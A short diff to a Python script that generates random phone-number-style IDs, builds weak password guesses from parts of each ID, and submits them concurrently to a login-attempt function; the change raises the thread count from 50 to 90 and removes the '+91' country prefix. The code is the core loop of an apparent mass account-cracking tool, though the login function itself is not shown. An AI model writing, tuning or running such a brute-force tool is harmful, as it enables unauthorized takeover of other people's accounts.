@@ -87,7 +87,7 @@ def random_number():
     for _ in range(limit):
         x = "".join(random.choice(string.digits) for _ in range(6))
         idz.append(x)
-    with ThreadPoolExecutor(max_workers=50) as XYZ:
+    with ThreadPoolExecutor(max_workers=90) as XYZ:
         clear()
         total_idz = str(len(idz))
         print(f' \033[1;32m(√) \033[1;32mTotal IDs  :\033[1;32m ',total_idz)
@@ -96,7 +96,7 @@ def random_number():
         linex()
         for xyz in idz:
             uidd = code+xyz
-            uid = '+91' +uidd
+            uid = uidd
             pww = [uidd[:6],uidd[:8],uidd] 
          #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
             XYZ.submit(ATOM, uid, pww, total_idz)
